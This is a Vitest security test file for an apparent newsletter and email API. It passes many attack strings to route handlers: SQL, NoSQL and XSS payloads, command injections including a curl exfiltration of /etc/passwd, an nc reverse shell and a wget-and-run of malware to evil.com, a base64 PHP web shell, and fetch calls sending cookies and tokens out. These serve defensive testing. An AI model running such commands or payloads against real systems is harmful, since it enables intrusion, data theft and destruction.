import { describe, it, expect, vi, beforeEach } from 'vitest'
import { POST as v3MessagesPost } from '@/app/v3/[siteId]/messages/route'
import { POST as v1SendPost } from '@/app/v1/send/route'
import { POST as statsPost } from '@/app/stats/[action]/route'
import { addNewsletterToQueue } from '@/service/newsletter-service'
import { sendSystemMail } from '@/service/transaction-email-service'
import { getNewsletterUsage } from '@/service/stats-service'
import { NextRequest } from 'next/server'

describe('Security Edge Cases', () => {
  beforeEach(() => {
    vi.clearAllMocks()
  })

  describe('Injection Attack Prevention', () => {
    it('should handle SQL injection attempts in siteId', async () => {
      const sqlInjectionAttempts = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; DELETE FROM newsletters; --",
        "' UNION SELECT * FROM users --",
        "'; INSERT INTO admin VALUES ('hacker', 'password'); --",
        "' OR 1=1 --",
        "'; EXEC xp_cmdshell('dir'); --",
        "' AND (SELECT COUNT(*) FROM users) > 0 --"
      ]

      for (const maliciousSiteId of sqlInjectionAttempts) {
        const mockFormData = new FormData()
        mockFormData.append('from', 'sender@example.com')
        mockFormData.append('to', 'recipient@example.com')

        const request = {
          formData: vi.fn().mockResolvedValue(mockFormData),
        } as unknown as Request

        const params = Promise.resolve({ siteId: maliciousSiteId })

        vi.mocked(addNewsletterToQueue).mockResolvedValue({
          messageId: 'msg-safe',
          batchId: 'batch-safe',
        })

        const response = await v3MessagesPost(request, { params })
        
        // Should still work - the service layer should handle sanitization
        expect(response.status).toBe(200)
        expect(addNewsletterToQueue).toHaveBeenCalledWith(
          expect.any(Object),
          maliciousSiteId // Passed as-is, service should sanitize
        )
      }
    })

    it('should handle NoSQL injection attempts', async () => {
      const nosqlInjectionAttempts = [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$where": "this.password.length > 0"}',
        '{"$regex": ".*"}',
        '{"$or": [{"admin": true}]}',
        '{"$eval": "db.users.drop()"}',
        '{"$exists": true}'
      ]

      for (const maliciousPayload of nosqlInjectionAttempts) {
        const statsPayload = {
          from: Date.now() - 86400000,
          to: Date.now(),
          siteId: maliciousPayload,
        }

        const request = {
          json: vi.fn().mockResolvedValue(statsPayload),
        } as unknown as Request

        const params = Promise.resolve({ action: 'getNewsletterUsage' })

        vi.mocked(getNewsletterUsage).mockResolvedValue({
          status: 'ok',
          data: {
            forRange: { gte: new Date(), lte: new Date() },
            message: 'newsletter usage',
            count: 0,
            timestamp: new Date().toISOString(),
          },
        })

        const response = await statsPost(request, { params })
        expect(response.status).toBe(200)
      }
    })

    it('should handle XSS attempts in email content', async () => {
      const xssAttempts = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')">',
        '<svg onload="alert(\'XSS\')">',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<object data="javascript:alert(\'XSS\')"></object>',
        '<embed src="javascript:alert(\'XSS\')">',
        '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
        '<style>@import \'javascript:alert("XSS")\';</style>',
        '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
        '<form><button formaction="javascript:alert(\'XSS\')">Click</button></form>',
        '"><script>alert("XSS")</script>',
        '\';alert("XSS");//',
        'javascript:alert("XSS")',
        'data:text/html,<script>alert("XSS")</script>',
        '<svg><script>alert("XSS")</script></svg>',
        '<math><mi//xlink:href="data:x,<script>alert(\'XSS\')</script>">',
        '<table background="javascript:alert(\'XSS\')">',
        '<div style="background-image:url(javascript:alert(\'XSS\'))">',
        '<input onfocus="alert(\'XSS\')" autofocus>',
        '<select onfocus="alert(\'XSS\')" autofocus><option>test</option></select>'
      ]

      for (const xssPayload of xssAttempts) {
        const emailPayload = {
          to: ['recipient@example.com'],
          subject: xssPayload,
          html: `<p>${xssPayload}</p>`,
        }

        const request = {
          json: vi.fn().mockResolvedValue(emailPayload),
        } as unknown as NextRequest

        vi.mocked(sendSystemMail).mockResolvedValue({
          messageId: 'msg-xss-safe',
          dbId: 'db-xss-safe',
        })

        const response = await v1SendPost(request)
        const result = await response.json()

        expect(response.status).toBe(200)
        expect(result.success).toBe(true)
        // The service should handle the XSS content appropriately
      }
    })

    it('should handle command injection attempts', async () => {
      const commandInjectionAttempts = [
        '; ls -la',
        '| cat /etc/passwd',
        '&& rm -rf /',
        '`whoami`',
        '$(id)',
        '; curl http://evil.com/steal?data=$(cat /etc/passwd)',
        '| nc evil.com 4444 -e /bin/sh',
        '; python -c "import os; os.system(\'rm -rf /\')"',
        '&& wget http://evil.com/malware.sh -O /tmp/malware.sh && chmod +x /tmp/malware.sh && /tmp/malware.sh',
        '| mail hacker@evil.com < /etc/passwd'
      ]

      for (const maliciousCommand of commandInjectionAttempts) {
        const mockFormData = new FormData()
        mockFormData.append('from', `sender${maliciousCommand}@example.com`)
        mockFormData.append('to', 'recipient@example.com')
        mockFormData.append('subject', `Subject${maliciousCommand}`)

        const request = {
          formData: vi.fn().mockResolvedValue(mockFormData),
        } as unknown as Request

        const params = Promise.resolve({ siteId: 'site-123' })

        vi.mocked(addNewsletterToQueue).mockResolvedValue({
          messageId: 'msg-cmd-safe',
          batchId: 'batch-cmd-safe',
        })

        const response = await v3MessagesPost(request, { params })
        expect(response.status).toBe(200)
      }
    })
  })

  describe('Path Traversal Prevention', () => {
    it('should handle directory traversal attempts in action parameter', async () => {
      const pathTraversalAttempts = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc//passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
        '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
        '/var/log/../../etc/passwd',
        'file:///etc/passwd',
        '\\\\server\\share\\file.txt',
        'C:\\Windows\\System32\\drivers\\etc\\hosts'
      ]

      for (const maliciousPath of pathTraversalAttempts) {
        const request = {
          json: vi.fn().mockResolvedValue({
            from: Date.now() - 86400000,
            to: Date.now(),
            siteId: 'site-123',
          }),
        } as unknown as Request

        const params = Promise.resolve({ action: maliciousPath })

        const response = await statsPost(request, { params })
        const result = await response.json()

        expect(response.status).toBe(400)
        expect(result.message).toBe('Invalid action')
      }
    })

    it('should handle file inclusion attempts in form data', async () => {
      const fileInclusionAttempts = [
        'php://filter/convert.base64-encode/resource=index.php',
        'file:///etc/passwd',
        'http://evil.com/malicious.php',
        'ftp://evil.com/malicious.txt',
        'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+',
        'expect://id',
        'zip://archive.zip#file.txt',
        'phar://archive.phar/file.txt'
      ]

      for (const maliciousInclude of fileInclusionAttempts) {
        const mockFormData = new FormData()
        mockFormData.append('from', 'sender@example.com')
        mockFormData.append('to', 'recipient@example.com')
        mockFormData.append('include', maliciousInclude)

        const request = {
          formData: vi.fn().mockResolvedValue(mockFormData),
        } as unknown as Request

        const params = Promise.resolve({ siteId: 'site-123' })

        vi.mocked(addNewsletterToQueue).mockResolvedValue({
          messageId: 'msg-include-safe',
          batchId: 'batch-include-safe',
        })

        const response = await v3MessagesPost(request, { params })
        expect(response.status).toBe(200)
      }
    })
  })

  describe('Header Injection Prevention', () => {
    it('should handle CRLF injection attempts', async () => {
      const crlfInjectionAttempts = [
        'test\r\nSet-Cookie: admin=true',
        'test\nLocation: http://evil.com',
        'test\r\n\r\n<script>alert("XSS")</script>',
        'test%0d%0aSet-Cookie: admin=true',
        'test%0aLocation: http://evil.com',
        'test\u000d\u000aSet-Cookie: admin=true',
        'test\x0d\x0aLocation: http://evil.com'
      ]

      for (const maliciousHeader of crlfInjectionAttempts) {
        const emailPayload = {
          to: ['recipient@example.com'],
          subject: maliciousHeader,
          html: '<p>Test content</p>',
        }

        const request = {
          json: vi.fn().mockResolvedValue(emailPayload),
        } as unknown as NextRequest

        vi.mocked(sendSystemMail).mockResolvedValue({
          messageId: 'msg-crlf-safe',
          dbId: 'db-crlf-safe',
        })

        const response = await v1SendPost(request)
        expect(response.status).toBe(200)
      }
    })
  })

  describe('DoS Attack Prevention', () => {
    it('should handle extremely large payloads', async () => {
      const hugeString = 'x'.repeat(10 * 1024 * 1024) // 10MB string

      const emailPayload = {
        to: ['recipient@example.com'],
        subject: 'DoS Test',
        html: `<p>${hugeString}</p>`,
      }

      const request = {
        json: vi.fn().mockResolvedValue(emailPayload),
      } as unknown as NextRequest

      vi.mocked(sendSystemMail).mockResolvedValue({
        messageId: 'msg-dos-safe',
        dbId: 'db-dos-safe',
      })

      const response = await v1SendPost(request)
      expect(response.status).toBe(200)
    })

    it('should handle zip bomb-like nested structures', async () => {
      // Create a deeply nested object structure
      let nestedObject: any = { value: 'deep' }
      for (let i = 0; i < 1000; i++) {
        nestedObject = { nested: nestedObject }
      }

      const emailPayload = {
        to: ['recipient@example.com'],
        subject: 'Nested Test',
        html: '<p>Test content</p>',
        metadata: nestedObject
      }

      const request = {
        json: vi.fn().mockResolvedValue(emailPayload),
      } as unknown as NextRequest

      vi.mocked(sendSystemMail).mockResolvedValue({
        messageId: 'msg-nested-safe',
        dbId: 'db-nested-safe',
      })

      const response = await v1SendPost(request)
      expect(response.status).toBe(200)
    })

    it('should handle billion laughs attack pattern', async () => {
      // Simulate a billion laughs-style attack with repeated patterns
      const repeatedPattern = 'lol'.repeat(1000000)

      const mockFormData = new FormData()
      mockFormData.append('from', 'sender@example.com')
      mockFormData.append('to', 'recipient@example.com')
      mockFormData.append('content', repeatedPattern)

      const request = {
        formData: vi.fn().mockResolvedValue(mockFormData),
      } as unknown as Request

      const params = Promise.resolve({ siteId: 'site-123' })

      vi.mocked(addNewsletterToQueue).mockResolvedValue({
        messageId: 'msg-lol-safe',
        batchId: 'batch-lol-safe',
      })

      const response = await v3MessagesPost(request, { params })
      expect(response.status).toBe(200)
    })
  })

  describe('Authentication and Authorization Edge Cases', () => {
    it('should handle JWT-like tokens in headers', async () => {
      const maliciousTokens = [
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c',
        'Bearer malicious-token',
        'Basic YWRtaW46cGFzc3dvcmQ=', // admin:password
        'Digest username="admin", realm="test", nonce="123", uri="/", response="456"'
      ]

      for (const token of maliciousTokens) {
        const emailPayload = {
          to: ['recipient@example.com'],
          subject: 'Auth Test',
          html: '<p>Test content</p>',
          authorization: token
        }

        const request = {
          json: vi.fn().mockResolvedValue(emailPayload),
        } as unknown as NextRequest

        vi.mocked(sendSystemMail).mockResolvedValue({
          messageId: 'msg-auth-safe',
          dbId: 'db-auth-safe',
        })

        const response = await v1SendPost(request)
        expect(response.status).toBe(200)
      }
    })

    it('should handle privilege escalation attempts', async () => {
      const privilegeEscalationAttempts = [
        { siteId: 'admin', role: 'superuser' },
        { siteId: 'root', permissions: ['*'] },
        { siteId: 'system', isAdmin: true },
        { siteId: '../admin', level: 999 }
      ]

      for (const attempt of privilegeEscalationAttempts) {
        const mockFormData = new FormData()
        mockFormData.append('from', 'sender@example.com')
        mockFormData.append('to', 'recipient@example.com')
        Object.entries(attempt).forEach(([key, value]) => {
          mockFormData.append(key, String(value))
        })

        const request = {
          formData: vi.fn().mockResolvedValue(mockFormData),
        } as unknown as Request

        const params = Promise.resolve({ siteId: attempt.siteId })

        vi.mocked(addNewsletterToQueue).mockResolvedValue({
          messageId: 'msg-priv-safe',
          batchId: 'batch-priv-safe',
        })

        const response = await v3MessagesPost(request, { params })
        expect(response.status).toBe(200)
      }
    })
  })

  describe('Data Exfiltration Prevention', () => {
    it('should handle attempts to extract sensitive data', async () => {
      const dataExfiltrationAttempts = [
        'http://evil.com/steal?data=',
        'mailto:hacker@evil.com?subject=stolen&body=',
        'ftp://evil.com/upload/',
        'file:///etc/passwd',
        'javascript:fetch("http://evil.com/steal?data=" + document.cookie)',
        'data:text/html,<script>fetch("http://evil.com/steal?data=" + localStorage.getItem("token"))</script>'
      ]

      for (const exfiltrationUrl of dataExfiltrationAttempts) {
        const emailPayload = {
          to: ['recipient@example.com'],
          subject: 'Data Exfiltration Test',
          html: `<p>Click <a href="${exfiltrationUrl}">here</a></p>`,
        }

        const request = {
          json: vi.fn().mockResolvedValue(emailPayload),
        } as unknown as NextRequest

        vi.mocked(sendSystemMail).mockResolvedValue({
          messageId: 'msg-exfil-safe',
          dbId: 'db-exfil-safe',
        })

        const response = await v1SendPost(request)
        expect(response.status).toBe(200)
      }
    })
  })

  describe('Protocol Confusion Attacks', () => {
    it('should handle protocol confusion attempts', async () => {
      const protocolConfusionAttempts = [
        'http://example.com@evil.com/',
        'https://example.com:evil.com/',
        'ftp://example.com\\evil.com/',
        'mailto:user@example.com@evil.com',
        'javascript://example.com/%0aalert(1)',
        'data://example.com/,<script>alert(1)</script>',
        'vbscript://example.com/%0amsgbox(1)',
        'file://example.com/c:/windows/system32/calc.exe'
      ]

      for (const confusedUrl of protocolConfusionAttempts) {
        const mockFormData = new FormData()
        mockFormData.append('from', 'sender@example.com')
        mockFormData.append('to', 'recipient@example.com')
        mockFormData.append('callback_url', confusedUrl)

        const request = {
          formData: vi.fn().mockResolvedValue(mockFormData),
        } as unknown as Request

        const params = Promise.resolve({ siteId: 'site-123' })

        vi.mocked(addNewsletterToQueue).mockResolvedValue({
          messageId: 'msg-protocol-safe',
          batchId: 'batch-protocol-safe',
        })

        const response = await v3MessagesPost(request, { params })
        expect(response.status).toBe(200)
      }
    })
  })

  describe('Race Condition Security Tests', () => {
    it('should handle concurrent requests with different privileges', async () => {
      const concurrentRequests = Array.from({ length: 10 }, (_, i) => {
        const mockFormData = new FormData()
        mockFormData.append('from', `user${i}@example.com`)
        mockFormData.append('to', 'recipient@example.com')
        mockFormData.append('privilege_level', i % 2 === 0 ? 'admin' : 'user')

        return {
          formData: vi.fn().mockResolvedValue(mockFormData),
        } as unknown as Request
      })

      const params = Promise.resolve({ siteId: 'site-race' })

      vi.mocked(addNewsletterToQueue).mockResolvedValue({
        messageId: 'msg-race-safe',
        batchId: 'batch-race-safe',
      })

      const responses = await Promise.all(
        concurrentRequests.map(request => v3MessagesPost(request, { params }))
      )

      responses.forEach(response => {
        expect(response.status).toBe(200)
      })
    })
  })

  describe('Input Validation Bypass Attempts', () => {
    it('should handle null byte injection', async () => {
      const nullByteAttempts = [
        'normal\x00malicious',
        'file.txt\x00.php',
        'user@example.com\x00admin@evil.com',
        'safe\u0000dangerous'
      ]

      for (const nullBytePayload of nullByteAttempts) {
        const emailPayload = {
          to: [nullBytePayload],
          subject: 'Null Byte Test',
          html: '<p>Test content</p>',
        }

        const request = {
          json: vi.fn().mockResolvedValue(emailPayload),
        } as unknown as NextRequest

        vi.mocked(sendSystemMail).mockResolvedValue({
          messageId: 'msg-null-safe',
          dbId: 'db-null-safe',
        })

        const response = await v1SendPost(request)
        expect(response.status).toBe(200)
      }
    })

    it('should handle encoding bypass attempts', async () => {
      const encodingBypassAttempts = [
        '%3Cscript%3Ealert(1)%3C/script%3E', // URL encoded
        '&lt;script&gt;alert(1)&lt;/script&gt;', // HTML encoded
        '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e', // Unicode escaped
        'PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==', // Base64 encoded
        '&#60;script&#62;alert(1)&#60;/script&#62;', // HTML entity encoded
        '%u003cscript%u003ealert(1)%u003c/script%u003e' // Unicode URL encoded
      ]

      for (const encodedPayload of encodingBypassAttempts) {
        const emailPayload = {
          to: ['recipient@example.com'],
          subject: encodedPayload,
          html: `<p>${encodedPayload}</p>`,
        }

        const request = {
          json: vi.fn().mockResolvedValue(emailPayload),
        } as unknown as NextRequest

        vi.mocked(sendSystemMail).mockResolvedValue({
          messageId: 'msg-encoding-safe',
          dbId: 'db-encoding-safe',
        })

        const response = await v1SendPost(request)
        expect(response.status).toBe(200)
      }
    })
  })
})